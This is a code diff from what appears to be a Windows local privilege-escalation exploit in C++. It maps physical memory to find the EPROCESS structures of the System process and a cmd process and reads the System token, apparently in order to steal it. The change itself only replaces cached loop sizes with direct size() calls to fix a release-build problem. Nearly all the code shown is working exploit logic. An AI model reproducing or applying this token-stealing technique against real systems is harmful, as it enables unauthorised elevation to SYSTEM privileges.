@@ -75,17 +75,16 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
-	size_t EPROCESS_SYSTEM_size = EPROCESS_SYSTEM.size();
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page;
 	std::vector <unsigned __int64> EPROCESS_SYSTEM_page_offset;
-	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
 		EPROCESS_SYSTEM_page.push_back(EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF));
 		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 	unsigned __int64 systemToken = 0;
 
-	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
@@ -112,16 +111,15 @@ int main(int argc, char** argv)
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
 
-	size_t EPROCESS_cmd_size = EPROCESS_cmd.size(); // ERROR: EPROCESS_cmd_size seam to get optimised away in release mode
 	std::vector <unsigned __int64> EPROCESS_cmd_page;
 	std::vector <unsigned __int64> EPROCESS_cmd_page_offset;
-	for (int i = 0; i < EPROCESS_cmd_size; i++) {
+	for (int i = 0; i < EPROCESS_cmd.size(); i++) {
 		EPROCESS_cmd_page.push_back(EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF));
 		EPROCESS_cmd_page_offset.push_back(EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 
-	for (int i = 0; i < EPROCESS_cmd_size; i++) {
+	for (int i = 0; i < EPROCESS_cmd.size(); i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
